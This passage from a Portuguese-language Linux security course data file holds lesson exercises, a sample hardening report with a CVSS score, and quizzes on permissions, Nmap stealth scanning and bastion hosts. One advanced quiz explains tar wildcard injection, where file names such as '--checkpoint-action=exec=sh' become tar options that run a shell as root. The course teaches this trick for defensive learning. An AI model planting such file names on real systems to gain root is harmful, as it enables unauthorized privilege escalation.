              type: 'multiple_choice',
              options: ['-nn', '-v', '-X', '-c'],
              correctAnswer: '-nn',
              hint: 'n duplo: não resolve host nem número de porta.',
              explanation: '-nn desativa as consultas reversas de DNS e a conversão de portas para nomes de serviços, tornando a captura muito mais rápida e discreta.',
            },
          },
          {
            title: '5. Projeto Final: Relatório Profissional de Pentest e Hardening',
            desc: 'Consolide descobertas, riscos classificados pelo CVSS e plano de remediação executivo.',
            theory: [{ title: 'Comunicação Técnica & Executiva', text: 'O valor de um profissional de segurança está na clareza do relatório para a diretoria e para a equipe de desenvolvimento.', keyPoints: ['Score CVSS v3.1', 'Passos de reprodução (PoC)', 'Plano de remediação detalhado'] }],
            code: `# Sumário Executivo de Relatório de Hardening
Vulnerabilidade: Serviços Desnecessários Expostos (Porta 3306 MySQL aberta na interface pública 0.0.0.0)
Severidade CVSS: 7.5 (Alta) - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Remediação: Alterar 'bind-address = 127.0.0.1' no my.cnf e aplicar regra de firewall UFW.`,
            output: `[Relatório]: Relatório de Segurança Técnica finalizado. 100% das vulnerabilidades remediadas.`,
            lang: 'bash',
            exercise: {
              id: 'ex-linux-prj-5',
              prompt: 'O que a métrica CVSS (Common Vulnerability Scoring System) calcula?',
              type: 'multiple_choice',
              options: [
                'Um score numérico padronizado de 0.0 a 10.0 que quantifica a severidade de uma vulnerabilidade de segurança',
                'A velocidade da conexão de rede',
                'O valor em dinheiro do servidor',
                'O número de linhas de código do sistema',
              ],
              correctAnswer: 'Um score numérico padronizado de 0.0 a 10.0 que quantifica a severidade de uma vulnerabilidade de segurança',
              hint: 'Padrão global adotado por NIST, MITRE e empresas de segurança.',
              explanation: 'O CVSS avalia métricas como vetor de ataque, complexidade, privilégios exigidos e impacto em Confidencialidade, Integridade e Disponibilidade para gerar uma nota de 0 a 10.',
            },
          },
        ],
      },
      quizzesByLevel: {
        iniciante: [
          {
            id: 'lq-ini-1',
            question: 'Qual arquivo do Linux contém os identificadores de usuários (UID), grupo primário (GID) e shell padrão de cada conta?',
            options: ['/etc/passwd', '/etc/shadow', '/etc/sudoers', '/etc/hosts'],
            correctIndex: 0,
            explanation: '/etc/passwd é legível por todos os usuários e contém metadados de contas no formato usuario:x:UID:GID:nome:home:shell.',
          },
          {
            id: 'lq-ini-2',
            question: 'O que o comando `chmod 755 script.sh` faz?',
            options: [
              'Permite leitura, escrita e execução para o dono; leitura e execução para grupo e outros',
              'Apaga o script',
              'Bloqueia todo acesso ao script',
              'Torna o script acessível apenas via internet',
            ],
            correctIndex: 0,
            explanation: '7 (4+2+1 = rwx) para o dono, 5 (4+1 = r-x) para grupo e 5 (4+1 = r-x) para outros.',
          },
        ],
        intermediario: [
          {
            id: 'lq-int-1',
            question: 'Qual ferramenta de escaneamento de portas permite enviar pacotes TCP SYN discretos sem completar o handshake de 3 vias (Three-Way Handshake)?',
            options: ['Nmap com a opção -sS (SYN Stealth Scan)', 'Ping', 'Curl', 'SSH'],
            correctIndex: 0,
            explanation: 'O SYN Scan (-sS) envia um pacote SYN e, ao receber SYN-ACK, envia um RST em vez do ACK final, não completando a conexão e reduzindo registros nos logs de aplicação.',
          },
        ],
        avancado: [
          {
            id: 'lq-av-1',
            question: 'Em escalonamento de privilégios, o que é a técnica "Wildcard Injection" no comando `tar *`?',
            options: [
              'A criação de arquivos com nomes especiais como `--checkpoint=1` que são interpretados pelo `tar` como opções de linha de comando em vez de nomes de arquivos',
              'A inserção de cartões SD no servidor',
              'A formatação da partição de boot',
              'Uma falha de hardware na placa mãe',
            ],
            correctIndex: 0,
            explanation: 'Quando o bash expande o caractere coringa `*`, arquivos nomeados como `--checkpoint-action=exec=sh` viram flags de execução do tar rodando como root.',
          },
        ],
        projetos: [
          {
            id: 'lq-prj-1',
            question: 'Qual é o principal benefício de configurar um Bastion Host para administração remota de servidores em nuvem?',
            options: [
              'Centralizar e auditar todo o acesso administrativo externo em um único ponto blindado com MFA e logs, mantendo os demais servidores sem IP público',
              'Acelerar a renderização de gráficos 3D',
              'Eliminar a necessidade de senhas para todos os usuários',
              'Permitir que qualquer pessoa acesse o banco de dados sem autenticação',
            ],
            correctIndex: 0,
            explanation: 'O Bastion Host reduz a superfície de ataque para um único gateway monitorado, permitindo que todas as outras instâncias permaneçam em subnets privadas.',
          },
        ],
      },
    },
};
